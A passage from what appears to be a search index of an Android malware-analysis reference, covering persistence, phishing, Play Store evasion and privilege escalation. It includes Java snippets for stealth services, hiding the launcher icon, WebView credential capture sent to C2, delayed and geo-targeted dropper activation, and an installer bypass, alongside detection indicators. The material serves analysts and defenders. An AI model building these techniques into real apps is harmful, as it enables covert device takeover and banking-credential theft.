boot broadcasts in addition to or instead of the standard one.</p>"},{"location":"attacks/persistence-techniques/#foreground-service","title":"Foreground Service","text":"<p>Android 8+ kills background services within minutes. The standard workaround is a foreground service, which requires a visible notification but is protected from the system's background execution limits.</p> Stealth Foreground Service with Hidden Notification <pre><code>public class PersistentService extends Service {\n    @Override\n    public int onStartCommand(Intent intent, int flags, int startId) {\n        NotificationChannel channel = new NotificationChannel(\n            \"stealth\", \" \", NotificationManager.IMPORTANCE_MIN);\n        channel.setShowBadge(false);\n        getSystemService(NotificationManager.class).createNotificationChannel(channel);\n\n        Notification notification = new Notification.Builder(this, \"stealth\")\n            .setSmallIcon(android.R.drawable.ic_dialog_info)\n            .setContentTitle(\" \")\n            .build();\n        startForeground(1, notification);\n        return START_STICKY;\n    }\n\n    @Override\n    public IBinder onBind(Intent intent) {\n        return null;\n    }\n}\n</code></pre> <p>The notification channel uses <code>IMPORTANCE_MIN</code> and a blank name to make the notification as invisible as possible. <code>START_STICKY</code> tells Android to restart the service if the system kills it. SpyNote and Anubis both rely on this pattern.</p>"},{"location":"attacks/persistence-techniques/#scheduled-execution","title":"Scheduled Execution","text":""},{"location":"attacks/persistence-techniques/#jobscheduler","title":"JobScheduler","text":"<p>Schedules work that survives process death. The system manages when the job runs based on constraints (network, charging, idle).</p> <pre><code>ComponentName serviceName = new ComponentName(context, MalwareJobService.class);\nJobInfo jobInfo = new JobInfo.Builder(1337, serviceName)\n    .setPersisted(true)\n    .setPeriodic(15 * 60 * 1000)\n    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)\n    .build();\n\nJobScheduler scheduler = context.getSystemService(JobScheduler.class);\nscheduler.schedule(jobInfo);\n</code></pre> <p><code>setPersisted(true)</code> makes the job survive reboots (requires <code>RECEIVE_BOOT_COMPLETED</code>). The minimum periodic interval is 15 minutes on Android 7+.</p>"},{"location":"attacks/persistence-techniques/#alarmmanager","title":"AlarmManager","text":"<p>For more precise timing. <code>setExactAndAllowWhileIdle()</code> fires even during Doze mode, though Android 12+ restricts exact alarms and requires <code>SCHEDULE_EXACT_ALARM</code> or <code>USE_EXACT_ALARM</code>.</p> <pre><code>AlarmManager alarmManager = context.getSystemService(AlarmManager.class);\nIntent intent = new Intent(context, WakeUpReceiver.class);\nPendingIntent pending = PendingIntent.getBroadcast(\n    context, 0, intent, PendingIntent.FLAG_IMMUTABLE);\nalarmManager.setExactAndAllowWhileIdle(\n    AlarmManager.ELAPSED_REALTIME_WAKEUP,\n    SystemClock.elapsedRealtime() + 60_000,\n    pending);\n</code></pre>"},{"location":"attacks/persistence-techniques/#accountmanager-sync-adapter","title":"AccountManager Sync Adapter","text":"<p>An underused but effective persistence method. The malware registers as a sync adapter for a custom account type. Android's sync framework periodically triggers the adapter, providing reliable execution without visible notifications.</p> <p>The sync adapter runs in its own process and benefits from the system's built-in retry and scheduling logic. Mandrake used this technique to maintain periodic C2 communication.</p>"},{"location":"attacks/persistence-techniques/#accessibility-service-persistence","title":"Accessibility Service Persistence","text":"<p>An active accessibility service is managed by the system and automatically restarted if it crashes. As long as the user doesn't manually revoke the toggle in Settings, the service persists indefinitely across reboots.</p> <p>This makes accessibility the most reliable persistence mechanism available without root. The malware can also use accessibility to prevent its own removal -- detecting when the user navigates to Settings &gt; Apps and pressing \"Back\" or \"Home\" before they can reach the uninstall button.</p>"},{"location":"attacks/persistence-techniques/#anti-uninstall-techniques","title":"Anti-Uninstall Techniques","text":""},{"location":"attacks/persistence-techniques/#device-admin","title":"Device Admin","text":"<p>Activating as a device administrator prevents uninstallation. The user must deactivate the admin first, but the malware can use accessibility to block navigation to the deactivation screen.</p> <p>Cerberus combined device admin with accessibility: any attempt to open device admin settings triggers the accessibility service to press Home, making deactivation nearly impossible without ADB or safe mode.</p>"},{"location":"attacks/persistence-techniques/#hiding-from-launcher","title":"Hiding from Launcher","text":"<p>Removing the launcher <code>Activity</code> from the manifest (or disabling the component at runtime) hides the app from the app drawer. The user can still find it in Settings &gt; Apps, but most users won't think to look there.</p> <pre><code>PackageManager pm = getPackageManager();\npm.setComponentEnabledSetting(\n    new ComponentName(this, LauncherActivity.class),\n    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,\n    PackageManager.DONT_KILL_APP);\n</code></pre> <p>Joker, FluBot, and many RATs use this immediately after initial execution.</p>"},{"location":"attacks/persistence-techniques/#firmware-level-persistence","title":"Firmware-Level Persistence","text":""},{"location":"attacks/persistence-techniques/#pre-installed-malware","title":"Pre-installed Malware","text":"<p>Triada achieved persistence by infecting the device firmware during manufacturing. The malware was embedded in the system partition (read-only at runtime), surviving factory resets and any user-level remediation. Only reflashing the firmware with a clean image removes it.</p> <p>This represents the most resilient form of persistence on Android. Discovered in budget devices where supply chain compromise occurred at the factory or during distribution.</p>"},{"location":"attacks/persistence-techniques/#root-based-system-installation","title":"Root-Based System Installation","text":"<p>Pegasus and other state-sponsored malware use exploit chains to gain root, then install themselves as a system app in <code>/system/app/</code> or <code>/system/priv-app/</code>. System apps persist across factory resets and receive elevated privileges. Short of reflashing the firmware, the malware is permanent.</p>"},{"location":"attacks/persistence-techniques/#battery-optimization-exemption","title":"Battery Optimization Exemption","text":"<p>Android's Doze mode and App Standby buckets restrict background execution. Malware requests exemption:</p> <pre><code>Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);\nintent.setData(Uri.parse(\"package:\" + getPackageName()));\nstartActivity(intent);\n</code></pre> <p>This shows a system dialog. Some families use accessibility to auto-tap \"Allow\" on this dialog. Others disguise the request behind a fake loading screen so the user doesn't realize what they're approving.</p>"},{"location":"attacks/persistence-techniques/#oem-specific-persistence","title":"OEM-Specific Persistence","text":"<p>Chinese OEMs (Xiaomi, Huawei, Oppo, Vivo) maintain their own autostart managers that independently restrict background apps. Even with <code>RECEIVE_BOOT_COMPLETED</code> and battery optimization disabled, these OEMs may kill the app unless it is whitelisted in their proprietary autostart list.</p> <p>Malware targeting these regions often includes OEM-specific code that detects the manufacturer and launches the appropriate settings intent to guide (or force via accessibility) the user into whitelisting the app.</p> <p>OEM Autostart Managers</p> <p>When testing on Xiaomi, Huawei, Oppo, or Vivo devices, check for autostart whitelist entries under OEM-specific settings. Malware that works reliably in the wild on these devices has likely solved the OEM background-kill problem -- look for <code>Build.MANUFACTURER</code> checks and vendor-specific <code>Intent</code> actions in the decompiled code.</p>"},{"location":"attacks/persistence-techniques/#android-mitigations","title":"Android Mitigations","text":"Restriction Version Impact Malware Workaround Background service limits Android 8+ Services killed within minutes Foreground service with notification Background location limits Android 10+ Location only while app is visible Foreground service with <code>location</code> type Foreground service launch restrictions Android 12+ Cannot start foreground service from background Boot receiver, alarm, or accessibility event as trigger Exact alarm restrictions Android 12+ <code>SCHEDULE_EXACT_ALARM</code> required Use <code>setAndAllowWhileIdle()</code> (inexact) or request permission Notification permission Android 13+ <code>POST_NOTIFICATIONS</code> required (runtime permission) Social engineer the grant, or use silent notification channels created pre-upgrade Background activity launch restrictions Android 10+ Cannot start activities from background <code>USE_FULL_SCREEN_INTENT</code> or accessibility <code>performGlobalAction</code> Foreground service type requirements Android 14+ Must declare foreground service type in manifest Declare appropriate type or use alternative persistence <p>Each restriction pushed malware toward more creative solutions. The overall trend is layering multiple persistence methods so that at least one survives the increasingly aggressive background restrictions.</p> <p>Layered Persistence</p> <p>Modern banking trojans never rely on a single persistence mechanism. Expect to find at least two or three methods in any sample -- typically a boot receiver combined with a foreground service and accessibility service persistence. Disabling only one layer during analysis may give the false impression that the malware has been neutralized.</p>"},{"location":"attacks/persistence-techniques/#persistence-method-comparison","title":"Persistence Method Comparison","text":"Method Survives Reboot Survives Force Stop Stealth Reliability Min Android Boot receiver Yes No High High All Foreground service No No Low (notification) High 8+ JobScheduler Yes (persisted) No High Medium 5+ AlarmManager No No High Medium All Sync adapter Yes No High Medium All Accessibility service Yes Yes (if enabled) Medium Very high 4.1+ Device admin N/A (anti-uninstall) N/A Low High All System app / firmware Yes Yes Very high Permanent All"},{"location":"attacks/persistence-techniques/#families-by-persistence-strategy","title":"Families by Persistence Strategy","text":"Family Primary Persistence Secondary Anti-Uninstall Triada Firmware System app Factory reset resistant Pegasus Root + system install Multiple Survives factory reset SpyNote Foreground service Boot receiver Hides from launcher Anubis Boot receiver Foreground service Device admin Cerberus Accessibility Boot receiver Device admin + accessibility block Joker JobScheduler Boot receiver Hides from launcher Hook Foreground service Boot receiver + accessibility Device admin FluBot Boot receiver Foreground service Hides from launcher, accessibility block Mandrake Sync adapter Boot receiver Hides from launcher GodFather Accessibility Foreground service Accessibility block"},{"location":"attacks/persistence-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>RECEIVE_BOOT_COMPLETED</code> in manifest with a <code>BroadcastReceiver</code></li> <li><code>FOREGROUND_SERVICE</code> with <code>IMPORTANCE_MIN</code> or <code>IMPORTANCE_NONE</code> notification channels</li> <li><code>DeviceAdminReceiver</code> declared in manifest</li> <li><code>SyncAdapter</code> and <code>AccountAuthenticator</code> XML metadata</li> <li><code>setComponentEnabledSetting()</code> calls targeting launcher activity</li> <li><code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> in manifest</li> </ul> Dynamic Indicators <ul> <li>Service immediately started after boot broadcast received</li> <li>Notification channel created with empty name or minimal importance</li> <li>Device admin activation prompt shown shortly after install</li> <li>Navigation to autostart manager or battery optimization settings via intent</li> <li>Accessibility service preventing navigation to app management screens</li> </ul>"},{"location":"attacks/phishing-techniques/","title":"Phishing &amp; Social Engineering","text":"<p>Tricking Android users into installing malware, surrendering credentials, or granting dangerous permissions. Unlike technical exploits that target software flaws, phishing targets human trust. On Android, the attack surface is broader than on desktop: SMS messages, push notifications, phone calls, QR codes, and sideloaded APKs all serve as delivery mechanisms.</p> <p>See also: Call Interception, Notification Suppression, Overlay Attacks</p> <p>Requirements</p> Requirement Details Permission Varies by technique: <code>SEND_SMS</code> for smishing propagation, <code>SYSTEM_ALERT_WINDOW</code> or <code>BIND_ACCESSIBILITY_SERVICE</code> for overlay phishing Trigger User interaction (tapping link, installing APK, granting permission) Payload Phishing page (HTML/WebView), fake tutorial overlay, or social engineering script"},{"location":"attacks/phishing-techniques/#delivery-vectors","title":"Delivery Vectors","text":"Vector Description Reach Example Families Smishing (SMS) Bulk SMS with malicious links, often spoofing sender ID Mass FluBot, Mamont, MoqHao Play Store dropper Benign app passes review, downloads malicious payload post-install High trust Anatsa, Joker, Harly Fake APK sites Cloned Play Store pages or standalone download sites hosting trojanized APKs Targeted GodFather, SpyNote QR code phishing Physical or digital QR codes leading to malicious download or credential page In-person Anatsa variants Malvertising Ad networks serving redirects to phishing or APK download pages Mass Vultur, Brokewell Messaging apps Malicious links spread through WhatsApp, Telegram, or other messengers Social graph FluBot, GriftHorse"},{"location":"attacks/phishing-techniques/#smishing-in-detail","title":"Smishing in Detail","text":"<p>SMS phishing remains the dominant initial access vector. The attacker sends a text containing a shortened URL or a domain visually similar to a trusted brand. On Android, the SMS app renders URLs as tappable links with no reputation check by default.</p> <p>FluBot weaponized this into a self-propagating worm: after infecting a device, it read the victim's contact list via <code>READ_CONTACTS</code> and <code>SEND_SMS</code>, then sent smishing messages to every contact. At its peak in 2021, FluBot generated millions of SMS messages per day across Europe.</p>"},{"location":"attacks/phishing-techniques/#play-store-droppers","title":"Play Store Droppers","text":"<p>The dropper pattern: a clean app (typically a PDF reader, QR scanner, or file manager) passes Google Play Protect review. After installation, it either downloads a second-stage APK from C2 or uses <code>DexClassLoader</code> to load a malicious DEX payload. Anatsa used this extensively throughout 2023-2024, with individual dropper apps reaching 100,000+ installs before removal.</p>"},{"location":"attacks/phishing-techniques/#credential-capture-techniques","title":"Credential Capture Techniques","text":""},{"location":"attacks/phishing-techniques/#webview-based-fake-login-pages","title":"WebView-Based Fake Login Pages","text":"<p>The malware loads an attacker-controlled HTML page inside a <code>WebView</code>. The page mimics a banking app's login screen. Credentials entered into the form are captured via JavaScript interface or intercepted via <code>shouldOverrideUrlLoading()</code>.</p> WebView Credential Interception <pre><code>webView.setWebViewClient(new WebViewClient() {\n    @Override\n    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {\n        String url = request.getUrl().toString();\n        if (url.contains(\"login_submit\")) {\n            Uri uri = request.getUrl();\n            String user = uri.getQueryParameter(\"username\");\n            String pass = uri.getQueryParameter(\"password\");\n            exfilToC2(user, pass);\n            return true;\n        }\n        return false;\n    }\n});\n</code></pre>"},{"location":"attacks/phishing-techniques/#overlay-based-credential-capture","title":"Overlay-Based Credential Capture","text":"<p>A fake UI drawn on top of the real banking app. Triggered when the target app reaches the foreground. Covered in depth in Overlay Attacks.</p>"},{"location":"attacks/phishing-techniques/#progressive-web-app-pwa-phishing","title":"Progressive Web App (PWA) Phishing","text":"<p>PWAs bypass sideloading warnings entirely</p> <p>The phishing page prompts the victim to \"install\" a Progressive Web App. The PWA is added to the home screen with a convincing icon and name (e.g., the victim's bank). When opened, it displays a full-screen credential harvesting form. PWAs install through the browser, so none of the standard APK sideloading protections apply. This technique was observed targeting Czech and Hungarian banking customers in 2024.</p>"},{"location":"attacks/phishing-techniques/#voice-based-attacks","title":"Voice-Based Attacks","text":""},{"location":"attacks/phishing-techniques/#fake-call-interception","title":"Fake Call Interception","text":"<p>Fakecalls intercepts outgoing calls to real bank phone numbers. When the victim dials their bank, Fakecalls cancels the real call and plays a pre-recorded IVR (Interactive Voice Response) that sounds identical to the bank's phone system. The fake IVR prompts the victim to enter card details via the keypad, which the malware captures.</p> <p>This requires <code>CALL_PHONE</code>, <code>READ_PHONE_STATE</code>, and the ability to detect outgoing calls. Targets Korean financial institutions.</p>"},{"location":"attacks/phishing-techniques/#voip-routed-vishing","title":"VoIP-Routed Vishing","text":"<p>LetsCAll malware routes all calls through attacker-controlled VoIP infrastructure. The victim believes they are speaking with their bank, but the call is handled by a human operator working for the attacker. This combines technical interception with live social engineering, making it harder to detect than pre-recorded approaches.</p>"},{"location":"attacks/phishing-techniques/#push-notification-phishing","title":"Push Notification Phishing","text":"<p>Malware with <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> can both read and generate push notifications. Attack pattern:</p> <ol> <li>Generate a fake push notification mimicking the victim's bank (\"Suspicious transaction detected -- verify now\")</li> <li>Notification tap opens a WebView credential harvesting page</li> <li>Simultaneously suppress real banking notifications to avoid contradicting the fake alert</li> </ol> <p>This is effective because users inherently trust push notifications from installed apps. TrickMo and GodFather both use this technique.</p>"},{"location":"attacks/phishing-techniques/#social-engineering-for-permission-grants","title":"Social Engineering for Permission Grants","text":"<p>Obtaining dangerous permissions (Accessibility, Device Admin, Notification Listener) requires convincing the victim to manually toggle settings. Common strategies:</p> Technique Implementation Target Permission Fake tutorial overlay Step-by-step instructions drawn over Settings app Accessibility \"Security update required\" Dialog claiming the OS needs an accessibility update Accessibility \"Battery optimization\" Claims the app needs accessibility for battery management Accessibility \"Enable notifications\" Tells user to enable notification access for \"full functionality\" Notification Listener \"Device protection\" Prompts user to activate device admin for \"anti-theft\" Device Admin \"Accessibility for disabled\" Poses as an assistive app that genuinely needs the permission Accessibility <p>Origin of the fake tutorial technique</p> <p>Cerberus popularized the fake tutorial overlay -- it literally draws arrows and text boxes on top of the Settings screen, guiding the victim through each toggle. Most modern banking trojans have adopted variations of this technique.</p>"},{"location":"attacks/phishing-techniques/#lure-themes-by-region","title":"Lure Themes by Region","text":"Theme Regions Example Families Package delivery (\"Your parcel is held\") Europe, Japan, Australia FluBot, MoqHao Bank security alert Global GodFather, Cerberus, Anubis Tax refund / government notice US, UK, Germany, Japan Hydra variants Crypto airdrop / wallet verification Global SpyAgent, SparkCat Voicemail notification Europe, US FluBot Chrome / browser update Global Hook, Brokewell, Vultur Flash Player update Legacy (pre-2021) Anubis, Cerberus Video player / media codec LATAM, Southeast Asia Gigabud, GoldPickaxe Government ID / MyGov India, Thailand, Vietnam GoldPickaxe Subscription fraud lure Global (Play Store) Joker, Harly <p>Geographic targeting goes beyond translation. Regional campaigns match local carriers, banks, postal services, and government agencies. GodFather maintains localized phishing pages for banks across 16+ countries, dynamically selecting the inject based on device locale and installed banking apps.</p>"},{"location":"attacks/phishing-techniques/#families-using-this-technique","title":"Families Using This Technique","text":"Family Primary Vector Lure Scale FluBot SMS worm Package delivery / voicemail Millions of SMS/day at peak Fakecalls Fake APK site Banking app clone Targeted (Korea) Mamont SMS Delivery tracking Russia-focused GodFather Fake APK site + dropper Banking / crypto 400+ targets, 16+ countries Anatsa Play Store dropper PDF reader / cleaner 100K+ installs per dropper Hook Malvertising Chrome update 400+ targets Joker Play Store dropper Utility apps Thousands of dropper apps GriftHorse Play Store + messenger Prize / reward 10M+ victims MoqHao SMS Package delivery Japan, South Korea SpyNote Fake APK site Utility / banking Targeted campaigns"},{"location":"attacks/phishing-techniques/#common-phishing-flow","title":"Common Phishing Flow","text":"<p>Typical end-to-end attack chain:</p> <ol> <li>Delivery: victim receives smishing text (\"Your package could not be delivered\")</li> <li>Landing page: link leads to a fake carrier site with \"Download tracking app\" button</li> <li>APK install: victim enables <code>REQUEST_INSTALL_PACKAGES</code> for the browser and installs the APK</li> <li>Permission escalation: app shows fake tutorial to enable Accessibility</li> <li>Overlay injection: malware detects banking app launch, shows overlay to capture credentials</li> <li>2FA interception: accessibility or SMS permissions used to intercept OTP</li> <li>Account takeover: credentials + OTP sent to C2, attacker logs in from their device</li> </ol> <p>Analyst Note</p> <p>Each step relies on social engineering rather than technical exploitation. The weakest link is always the initial tap on a link in a text message. When analyzing a sample, trace the full chain from delivery vector through permission escalation to understand the complete attack flow.</p>"},{"location":"attacks/phishing-techniques/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>HTML files mimicking banking login pages in assets or downloaded to internal storage</li> <li>Hardcoded SMS message templates with URL placeholders</li> <li><code>BroadcastReceiver</code> for <code>SMS_RECEIVED</code> or <code>WAP_PUSH_RECEIVED</code></li> <li><code>TelephonyManager</code> or <code>CallScreeningService</code> usage for call interception</li> <li>Localized string resources matching phishing lure themes</li> </ul> Dynamic Indicators <ul> <li>Outbound SMS to numbers not in contacts (worm propagation)</li> <li>WebView loading credential-harvesting URLs</li> <li>Fake notifications generated matching banking app package names</li> <li>Calls intercepted and rerouted through VoIP endpoints</li> </ul>"},{"location":"attacks/play-store-evasion/","title":"Play Store Evasion","text":"<p>Techniques malware uses to bypass Google Play Protect and store review to distribute through the official Play Store. The dropper-based distribution model is the dominant strategy for Android banking malware since 2020 -- a clean app passes all checks at upload, then downloads or activates its malicious payload post-installation. Understanding these techniques is essential for analyzing how malware reaches millions of devices through a trusted distribution channel.</p> <p>See also: Dynamic Code Loading, Persistence Techniques, Anti-Analysis Techniques, Mass Malware Generation</p> <p>Scale of the Problem</p> <p>Google removed over 2.3 million apps from the Play Store in 2024 for policy violations. Despite automated scanning (Play Protect) and manual review, sophisticated droppers consistently bypass all layers. ThreatFabric and Cleafy regularly document families that survive on the store for months before detection.</p>"},{"location":"attacks/play-store-evasion/#dropper-chains","title":"Dropper Chains","text":"<p>The standard architecture separates benign-looking dropper apps from actual malicious payloads across multiple stages.</p>"},{"location":"attacks/play-store-evasion/#stage-1-the-clean-app","title":"Stage 1: The Clean App","text":"<p>A functional utility (PDF reader, QR scanner, file manager, phone cleaner) published to the Play Store. Contains zero malicious code at upload time. Often accumulates thousands of legitimate downloads and positive reviews before activation.</p> <pre><code>public class CleanApp extends Application {\n    @Override\n    public void onCreate() {\n        super.onCreate();\n        if (shouldActivate()) {\n            fetchPayload();\n        }\n    }\n\n    private boolean shouldActivate() {\n        long installTime = getPackageManager()\n            .getPackageInfo(getPackageName(), 0).firstInstallTime;\n        long daysSinceInstall = (System.currentTimeMillis() - installTime)\n            / (1000 * 60 * 60 * 24);\n        return daysSinceInstall &gt; 14 &amp;&amp; !isEmulator() &amp;&amp; checkGeo();\n    }\n}\n</code></pre>"},{"location":"attacks/play-store-evasion/#stage-2-payload-delivery","title":"Stage 2: Payload Delivery","text":"<p>Once activation conditions are met, the dropper downloads an encrypted DEX or APK from C2:</p> Delivery Method Stealth Level Families Using It Direct APK download + install prompt Low Early SharkBot Encrypted DEX loaded via <code>DexClassLoader</code> High Anatsa, Joker Steganographic PNG with embedded payload Very High Necro Native library decrypts embedded DEX High Mandrake Base64 in SharedPreferences Medium Joker variants"},{"location":"attacks/play-store-evasion/#stage-3-modular-c2-plugins","title":"Stage 3: Modular C2 Plugins","text":"<p>Advanced families download individual capability modules as separate DEX files from C2, activating only what the operator needs for a specific target. This minimizes the attack surface exposed to any single analysis.</p>"},{"location":"attacks/play-store-evasion/#versioning-attacks","title":"Versioning Attacks","text":"<p>The dropper publishes as a legitimate app and accumulates installs and reviews. After weeks or months, a malicious update is pushed. Google's Threat Analysis Group documented this as \"versioning\" in 2023 -- initial versions pass review, later versions introduce dynamic code loading that fetches the actual malware.</p> <p>Anatsa demonstrated this in 2024: a phone cleaner app was published to the Play Store, and approximately six weeks later, a malicious update activated the dropper functionality. By that point it had already accumulated enough installs and reviews to appear trustworthy. In July 2025, Zscaler reported an Anatsa dropper disguised as a PDF reader reached 90,000 downloads and the #4 spot in \"Top Free - Tools\" before detection.</p>"},{"location":"attacks/play-store-evasion/#geographic-targeting","title":"Geographic Targeting","text":"<p>Malware activates only in target countries to reduce exposure and evade analysis environments that typically run in US/EU cloud infrastructure.</p> Check Method Reliability Bypass Difficulty SIM country code (<code>TelephonyManager.getSimCountryIso()</code>) High Requires physical SIM from target country Network country code (<code>getNetworkCountryIso()</code>) Medium VPN does not change this IP geolocation (server-side) Medium Detectable via VPN/proxy System locale / language Low Easily spoofed Timezone Low Easily spoofed <pre><code>private boolean isTargetCountry() {\n    TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);\n    String simCountry = tm.getSimCountryIso().toUpperCase();\n    String[] targets = {\"DE\", \"GB\", \"IT\", \"ES\", \"AU\", \"TR\"};\n    return Arrays.asList(targets).contains(simCountry);\n}\n</code></pre> <p>MITRE ATT&amp;CK documents this as T1627.001 (Geofencing). Anatsa campaigns in 2024 specifically targeted the UK, Germany, Spain, Slovakia, Slovenia, and Czech Republic while avoiding Eastern European and Chinese IP ranges. Analysis environments in non-target geolocations never trigger payload delivery, resulting in clean verdicts.</p>"},{"location":"attacks/play-store-evasion/#delayed-activation","title":"Delayed Activation","text":"<p>Malware waits hours, days, or weeks before contacting C2 or enabling malicious functionality. Google Play Protect's automated analysis sandbox runs apps for a limited time window -- sleeping through it guarantees a clean scan.</p> <p>Common delay strategies:</p> Strategy Implementation Detection Risk Time bomb Check <code>firstInstallTime</code>, activate after N days Low if delay &gt; 72 hours C2 kill switch Server returns \"inactive\" until operator decides Very low -- no local trigger Interaction count Activate after N app opens by user Low -- sandbox interaction is minimal Update trigger First version clean, malicious update activates dropper Low -- review focuses on diff <p>The C2 kill switch is the most effective: the dropper app calls home, and the server decides whether this device should receive the payload. During review periods or when analysis is detected, the server simply never delivers. Mandrake survived on Google Play for over two years (2022-2024) using this approach, with Kaspersky reporting that five apps sat on the store undetected.</p>"},{"location":"attacks/play-store-evasion/#code-hiding-techniques","title":"Code Hiding Techniques","text":""},{"location":"attacks/play-store-evasion/#obfuscated-native-loaders","title":"Obfuscated Native Loaders","text":"<p>Mandrake hides its initial stage in a native library (<code>libopencv_dnn.so</code>) heavily obfuscated using OLLVM. This library exports functions to decrypt a second-stage DEX loader from the APK's assets folder. Native code is significantly harder for Play Protect to analyze compared to Dalvik bytecode.</p>"},{"location":"attacks/play-store-evasion/#steganographic-payloads","title":"Steganographic Payloads","text":"<p>Necro (2024) used steganography to hide payloads inside PNG images. The Coral SDK embedded in the dropper sends an encrypted POST request to C2, which responds with a link to a PNG file. The payload is encoded in the least significant bits of the image's blue channel as Base64. This technique infected 11 million devices across apps including Wuta Camera (10M+ downloads) and Max Browser (1M+ downloads).</p>"},{"location":"attacks/play-store-evasion/#runtime-string-decryption","title":"Runtime String Decryption","text":"<p>Anatsa decrypts each string at runtime using a dynamically generated DES key, preventing static extraction of C2 URLs, package names, or other indicators. Combined with emulation checks and device model verification, this defeats both static and dynamic analysis in automated sandboxes.</p>"},{"location":"attacks/play-store-evasion/#manifest-corruption","title":"Manifest Corruption","text":"<p>SoumniBot and some Anatsa variants inject malformed data into the APK's <code>AndroidManifest.xml</code>, intentionally corrupting compression parameters. The Android runtime tolerates these malformations and parses the manifest correctly, but analysis tools (apktool, aapt) crash or produce incomplete output.</p>"},{"location":"attacks/play-store-evasion/#families-and-play-store-campaigns","title":"Families and Play Store Campaigns","text":"Family Store Disguise Evasion Techniques Downloads Before Removal Anatsa PDF readers, QR scanners, file managers Versioning, geo-targeting, DES string encryption, manifest corruption 90,000+ per campaign SharkBot Antivirus apps, file managers Reduced APK functionality, payload via C2 update 50,000+ Joker Messaging, wallpapers, cameras Base64 DEX in strings, DCL from C2 Millions across hundreds of apps Harly Games, utilities Encrypted payload in APK assets Millions Necro Camera apps, browsers Steganographic PNG, Coral SDK loader 11,000,000+ Mandrake Wi-Fi tools, astronomy, file sharing OLLVM native loader, multi-year dormancy, C2 kill switch 32,000+ Xenomorph Fast Cleaner Dropper downloads payload APK 50,000+ GoldPickaxe Government services, utility apps Social engineering for TestFlight/Enterprise certs Targeted campaigns Grabos Music players, utilities Commercial obfuscator hiding PPI fraud code 4,200,000-17,500,000 across 144 apps Goldoson Popular Korean utility/game apps Malicious SDK embedded in legitimate apps 100,000,000+ across 60+ apps Xamalicious Health, games, horoscope, productivity Xamarin framework as packer, dynamic second-stage DLL loading 327,000+ across 25 apps"},{"location":"attacks/play-store-evasion/#session-based-installer-bypass","title":"Session-Based Installer Bypass","text":"<p>Android 13 introduced Restricted Settings to block sideloaded apps from accessing Accessibility Services and Notification Listener. Apps installed via a session-based <code>PackageInstaller</code> API (the method used by Play Store and legitimate app marketplaces) are exempt from this restriction.</p> <p>SecuriDropper (dropper-as-a-service) exploits this by using the session-based installer to install its malicious payload, making Android unable to distinguish it from a marketplace-installed app. The payload then freely requests Accessibility Service access. This bypass works on Android 13 and 14.</p> <pre><code>PackageInstaller installer = getPackageManager().getPackageInstaller();\nPackageInstaller.SessionParams params = new PackageInstaller.SessionParams(\n    PackageInstaller.SessionParams.MODE_FULL_INSTALL);\n\nint sessionId = installer.createSession(params);\nPackageInstaller.Session session = installer.openSession(sessionId);\n\nOutputStream out = session.openWrite(\"payload.apk\", 0, apkBytes.length);\nout.write(apkBytes);\nout.close();\n\nsession.commit(PendingIntent.getBroadcast(\n    this, sessionId, new Intent(\"INSTALL_COMPLETE\"),\n    PendingIntent.FLAG_MUTABLE).getIntentSender());\n</code></pre> <p>SpyNote and Anatsa droppers adopted this technique within weeks of Restricted Settings launching, as documented by cryptax.</p>"},{"location":"attacks/play-store-evasion/#android-version-changes","title":"Android Version Changes","text":"Version Change Impact on Evasion Android 11 Package visibility restrictions Malware must declare <code>QUERY_ALL_PACKAGES</code> or use targeted <code>&lt;queries&gt;</code> Android 13 Restricted Settings for sideloaded apps Bypassed via session-based installer within weeks Android 14 Restricted Settings still bypassable SecuriDropper technique persists Android 14 Dynamic code loading warnings for writable paths Malware switches to <code>InMemoryDexClassLoader</code> or read-only files Android 15 Enhanced Play Protect live threat detection Real-time behavioral analysis catches some delayed activation Android 15 Stricter DCL enforcement for API 35+ Loaded DEX must be in read-only paths"},{"location":"attacks/play-store-evasion/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code> usage</li> <li><code>PackageInstaller.Session</code> API calls (session-based installer abuse)</li> <li>Encrypted blobs in <code>assets/</code> with high Shannon entropy</li> <li><code>TelephonyManager</code> calls for SIM/network country checks</li> <li>Native libraries with OLLVM obfuscation indicators</li> <li>Manifest parsing errors in apktool/aapt</li> </ul> Dynamic Indicators <ul> <li>Long delay (hours/days) before first C2 contact</li> <li>Payload DEX files appearing in app-private directories after delay</li> <li>Network requests conditional on device locale, SIM, or IP geolocation</li> <li>PNG/JPEG downloads followed by class loading (steganographic delivery)</li> <li><code>PackageInstaller</code> session creation for secondary APK installation</li> </ul> Sandbox Evasion Checks to Watch For <ul> <li><code>Build.FINGERPRINT</code> containing \"generic\" or \"sdk\"</li> <li><code>Build.MODEL</code> matching known emulator models</li> <li><code>/dev/socket/qemud</code>, <code>/dev/qemu_pipe</code> file existence checks</li> <li>SIM operator/country returning empty or default values</li> <li>Battery temperature/level anomalies (emulators report static values)</li> <li><code>Settings.Secure.ANDROID_ID</code> set to known emulator defaults</li> </ul>"},{"location":"attacks/privilege-escalation/","title":"Privilege Escalation","text":"<p>Gaining elevated privileges on an Android device beyond what the app sandbox permits -- from kernel root exploits and SELinux bypasses to abusing leaked platform signing keys and chaining runtime permissions into full device control. Privilege escalation is the dividing line between commodity malware (which operates within the permission model) and commercial spyware (which breaks out of it entirely).</p> <p>See also: Accessibility Abuse, Device Admin Abuse, SELinux</p> <p>Requirements</p> Requirement Details Root exploits Unpatched kernel or driver vulnerability on target device SELinux bypass Root access or kernel write primitive to modify policy/hooks Platform cert abuse Leaked or stolen OEM platform signing certificate Permission chains Social engineering + accessibility service enablement Zero-click No user interaction; exploits in baseband, Bluetooth, or RCS processing"},{"location":"attacks/privilege-escalation/#root-exploits-historical","title":"Root Exploits (Historical)","text":"<p>Privilege escalation on Android historically meant getting root. Before modern SELinux enforcement and verified boot, a single kernel vulnerability could give an attacker uid 0 and full device control. These exploits remain relevant: millions of unpatched devices still run in the wild, and commercial spyware vendors maintain private exploit chains targeting current kernels.</p>"},{"location":"attacks/privilege-escalation/#framaroot-2013-2014","title":"Framaroot (2013--2014)","text":"<p>One-click root tool exploiting 